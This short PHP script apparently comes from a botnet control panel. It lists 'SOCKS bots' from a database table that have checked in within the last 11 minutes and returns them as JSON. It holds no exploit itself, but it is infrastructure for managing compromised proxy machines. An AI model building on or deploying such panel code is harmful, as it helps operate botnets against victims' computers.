<?php
include('auth.php');
include("./inc/config.php");
require_once("./JSON.php");
$sql = "SELECT * FROM `lst_socks_bots` WHERE 1;";  
$res = mysql_query($sql);
$nbrows = 0;
if(mysql_num_rows($res)>0) {
    while($rec = mysql_fetch_array($res)) {
        if ($rec['lasttime']  >= (time() - (60 * 11) ))
        {
            $nbrows = $nbrows + 1;
            $arr[] = $rec;
        }
    }
    $jsonresult = json_encode($arr);
    echo '{"results":'.$jsonresult.', "total":"'.$nbrows.'"}';
} else {
    echo '({"total":"0", "results":""})';
}
die("");
?>